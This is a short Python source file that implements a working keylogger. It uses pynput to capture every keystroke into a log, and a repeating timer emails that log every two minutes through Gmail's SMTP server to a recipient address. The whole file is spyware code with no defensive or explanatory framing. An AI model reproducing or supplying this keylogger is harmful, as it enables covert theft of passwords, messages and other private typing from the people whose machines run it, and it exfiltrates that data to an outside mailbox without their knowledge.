import pynput.keyboard
import threading
import smtplib
class Keylogger:
	def __init__(self,email_s,email_r,password):
		self.log="keylogger started"
		self.email_s=email_s
		self.email_r=email_r
		self.password=password
	def append_to_log(self,string):
		self.log=self.log+string
	def process_key_press(self,key):
		try:
		    current_key=str(key.char)
		except AttributeError:
			if key == key.space:
				current_key=" "
			else:
				current_key=" "+str(key)+" "
		self.append_to_log(current_key)
	def report(self):
		self.send_mail(self.email_s,self.email_r,self.password,"\n\n"+self.log)
		self.log=""
		timer=threading.Timer(120,self.report)
		timer.start()
	def send_mail(self,email_s,email_r,password,message):
	    server=smtplib.SMTP("smtp.gmail.com",587)
	    server.starttls()
	    server.login(email_s,password)
	    server.sendmail(email_s,email_r,message)
	    server.quit()
	def start(self):
		keyboard_listner = pynput.keyboard.Listener(on_press=self.process_key_press)
		with keyboard_listner:
			self.report()
			keyboard_listner.join()
